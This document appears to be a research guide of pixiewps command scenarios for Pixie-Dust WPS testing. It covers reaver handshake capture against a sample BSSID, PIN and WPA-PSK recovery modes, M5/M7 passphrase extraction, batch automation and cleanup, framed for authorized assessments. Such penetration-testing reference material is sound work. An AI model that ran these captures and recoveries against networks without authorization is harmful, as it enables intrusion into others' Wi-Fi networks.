# pixiewps — command scenarios for deep research

Installed build: Pixiewps 1.4 (Debian package `pixiewps` `1.4.2-5`). Every
option below appears in [`help.txt`](help.txt). Pixiewps is offline: scenarios
separate capture (done with reaver or a pcap) from computation (done here).

> **Scope:** Pixie-Dust recovers WPS PINs and, on some APs, the WPA-PSK. It is
> offline and does not touch the network, but the recovered secrets are still
> sensitive. Use it only on networks you are authorized to test, and handle
> the inputs and outputs as engagement evidence.

## How to invoke

```text
@deep-research For an authorized WPS assessment, explain the Pixie-Dust
attack against WPS as implemented in pixiewps 1.4. Which values from the
M1/M2/M3 exchange are required, how do modes 1–5 differ in the weak RNG they
target, and why is mode 3 date-bounded? Which chipsets are known vulnerable,
and what did vendors change to mitigate it? Cite the pixiewps repository,
the WPS specification, Dominique Bongard's Pixie-Dust paper, and vendor
advisories; separate confirmed fact from inference and state confidence.
```

Create an evidence workspace before capturing anything:

```bash
mkdir -p ~/pixiewps-demo/evidence
date -u +'%Y-%m-%dT%H:%M:%SZ' > ~/pixiewps-demo/evidence/run-start.txt
pixiewps -h > ~/pixiewps-demo/evidence/help.txt
```

## Scenario 1 — understand the inputs

The tool is only as good as the values you feed it. Map each argument to a WPS
message before running a computation.

| # | Command | How to use |
|---|---------|------------|
| 1 | `pixiewps -h` | Full argument reference |
| 2 | `dpkg-query -W -f='${Version}\n' pixiewps` | Installed version |
| 3 | `man pixiewps \| col -b \| sed -n '1,60p'` | Packaged manual |
| 4 | `pixiewps 2>&1 \| head -20` | Behaviour with no arguments |
| 5 | `pixiewps -e 00 -r 00 2>&1 \| head -20` | Error handling for short values |
| 6 | `sudo wash -i wlan0mon -j` | Identify WPS version and state |
| 7 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -O /tmp/pixie.pcap -vv` | Capture the handshake |
| 8 | `tcpdump -r /tmp/pixie.pcap -nn 2>/dev/null \| head` | Confirm the capture is readable |

**Research questions**
- Which WPS message carries each required value?
- What does `wash -j` report that helps predict vulnerability?
- Why does pixiewps need both nonces and the BSSID?
- What happens when a required value is missing or malformed?
- Which values can be extracted from a pcap offline?

**Sources:** `pixiewps -h`; WPS specification (M1–M8); `wash -h`;
`reaver -h`.
**Output:** an input map from WPS message to pixiewps argument.

## Scenario 2 — standard Pixie-Dust computation

The short form with `-S` is the common path because stock reaver does not
expose the authentication key.

| # | Command | How to use |
|---|---------|------------|
| 9 | `pixiewps -e <pke> -s <e-hash1> -z <e-hash2> -S -n <e-nonce> -m <r-nonce> -b <e-bssid>` | Standard short form |
| 10 | `pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce> -m <r-nonce> -b <e-bssid>` | Full form with auth key |
| 11 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid>` | Default modes only |
| 12 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 1` | Mode 1 only |
| 13 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 2` | Mode 2 only |
| 14 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3` | Mode 3 only |
| 15 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 1,2,3` | Explicit default set |

**Research questions**
- What does the short form compute that the full form takes as input?
- Why is `-a` impractical with stock reaver?
- Which mode succeeds first on a given AP, and does order matter?
- What does a "not vulnerable" result actually rule out?
- How long does each mode take, and which dominates?

**Sources:** `pixiewps -h`; Pixie-Dust paper; upstream pixiewps README.
**Output:** a per-mode result table with runtime and recovered values.

## Scenario 3 — mode 3 and date bounds

Mode 3 targets RTL819x-style time-seeded RNG. The date window is the search
space, so choosing it well is the difference between seconds and hours.

| # | Command | How to use |
|---|---------|------------|
| 16 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3 --start 01/2020 --end 12/2023` | Bounded window |
| 17 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3 --start 2020` | Year-only start |
| 18 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3 --end 2023` | Year-only end |
| 19 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3 --force` | Search back to 1970 |
| 20 | `time pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 3 --force` | Measure the full search |
| 21 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> --mode 4,5` | Experimental modes |

**Research questions**
- What is the earliest and latest date the tool accepts, and why?
- What does `--force` change about the direction of the search?
- How does the AP's manufacturing date narrow the window?
- Why are modes 4 and 5 experimental?
- What false-positive risk do the experimental modes carry?

**Sources:** `pixiewps -h`; upstream pixiewps README; RTL819x chipset
documentation; Unix epoch and 32-bit time limits.
**Output:** a mode-3 search plan tied to a device date estimate.

## Scenario 4 — M5/M7 recovery

On some mode-3 APs, the encrypted settings in M5 and M7 reveal the PSK and the
secret nonces. This is the only path that recovers the passphrase directly.

| # | Command | How to use |
|---|---------|------------|
| 22 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -7 <enc7> --mode 3` | Recover PSK from M7 |
| 23 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -7 <enc7> -5 <enc5> --mode 3` | Recover PSK and nonce 1 |
| 24 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -7 <enc7> -5 <enc5> -s <e-hash1> -z <e-hash2> --mode 3` | Recover PSK and PIN |
| 25 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> -5 <enc5> --mode 3` | Show that `-5` alone is rejected |
| 26 | `sudo reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -K -O /tmp/pixie.pcap -vv` | Capture M5/M7 |
| 27 | `tshark -r /tmp/pixie.pcap -Y wps 2>/dev/null \| head` | Locate WPS messages |

**Research questions**
- Which APs expose usable M5/M7 settings?
- Why must `-5` be used with `-7`?
- What is the difference between recovering the PIN and the PSK?
- How do you extract `enc5` and `enc7` from a capture?
- What does a failure in `-7` imply about the AP's RNG?

**Sources:** `pixiewps -h`; WPS specification; upstream pixiewps README;
`tshark` display filters.
**Output:** a PSK/PIN recovery record with the capture evidence.

## Scenario 5 — automation and reproducibility

Pixiewps is scriptable, which makes it suitable for a batch of captures. Keep
the inputs and outputs paired.

| # | Command | How to use |
|---|---------|------------|
| 28 | `pixiewps -e <pke> -r <pkr> -n <e-nonce> -m <r-nonce> -b <e-bssid> > /tmp/pixie.out 2>&1` | Capture the output |
| 29 | `echo "exit=$?"` | Record the exit status |
| 30 | `for m in 1 2 3; do pixiewps ... --mode $m; done` | Loop modes |
| 31 | `sha256sum /tmp/pixie.pcap` | Hash the source capture |
| 32 | `sha256sum /tmp/pixie.out` | Hash the result |
| 33 | `diff <(pixiewps ... ) <(pixiewps ... )` | Check determinism |
| 34 | `man pixiewps \| col -b \| grep -n 'EXIT'` | Documented exit codes |

**Research questions**
- Is the computation deterministic for fixed inputs and mode?
- What exit status indicates success versus "not vulnerable"?
- How do you associate a result with the capture it came from?
- What should a batch runner do on timeout?
- Which artifacts belong in the report?

**Sources:** `pixiewps -h`; upstream source and README; shell exit-status
conventions.
**Output:** a reproducible batch record with paired hashes.

## Scenario 6 — interpret results and clean up

The result is a claim about the AP's RNG, not about the network's overall
security. State it precisely.

| # | Command | How to use |
|---|---------|------------|
| 35 | `pixiewps ... --mode 1,2,3,4,5` | Try every mode once |
| 36 | `grep -iE 'pin\|psk\|not vulnerable\|failed' /tmp/pixie.out` | Summarise the result |
| 37 | `sudo wash -i wlan0mon` | Re-survey the AP |
| 38 | `iw dev` | Confirm interface state |
| 39 | `sudo airmon-ng stop wlan0mon` | Remove monitor interface |
| 40 | `sudo systemctl restart NetworkManager` | Restore connectivity |
| 41 | `ls -l /tmp/pixie.pcap /tmp/pixie.out` | Collect artifacts |
| 42 | `rm -f /tmp/pixie.out` | Remove plaintext results at close |

**Research questions**
- What does "not vulnerable" mean, and what does it not mean?
- Which modes produced the result, and how would you reproduce it?
- What does a recovered PSK imply for the rest of the engagement?
- Which artifacts must be encrypted or destroyed?
- How do you prove the radio was restored?

**Sources:** `pixiewps -h`; `wash -h`; `iw dev`; evidence-handling practice.
**Output:** a precise finding statement and a cleanup record.

## Flag coverage checklist

| Flag | Scenario |
|------|----------|
| `-h` | 1 |
| `-e`, `--pke` | 1, 2 |
| `-r`, `--pkr` | 2 |
| `-s`, `--e-hash1` | 2, 4 |
| `-z`, `--e-hash2` | 2, 4 |
| `-a`, `--authkey` | 2 |
| `-n`, `--e-nonce` | 2 |
| `-m`, `--r-nonce` | 2 |
| `-b`, `--e-bssid` | 2 |
| `-S`, `--dh-small` | 2 |
| `--mode` | 2, 3, 5 |
| `--start`, `--end`, `--force` | 3 |
| `-7`, `--m7-enc` | 4 |
| `-5`, `--m5-enc` | 4 |

Full text: [`help.txt`](help.txt).

## Scenario index

| Scenario | Task | Commands |
|----------|------|----------|
| 1 | Understand the inputs | 8 |
| 2 | Standard Pixie-Dust computation | 7 |
| 3 | Mode 3 and date bounds | 6 |
| 4 | M5/M7 recovery | 6 |
| 5 | Automation and reproducibility | 7 |
| 6 | Interpret results and clean up | 8 |
| **Total** | | **42** |

## Legal and safety

Pixiewps is offline, so it cannot disrupt a network by itself. The capture
step does interact with the AP, and recovered PINs and PSKs are sensitive.
Use it only with written authorization, keep the source capture and the
computed result paired and hashed, and delete plaintext outputs at close.
Do not present a Pixie-Dust failure as proof that an AP is secure: it only
rules out the weak-RNG modes that were tried.
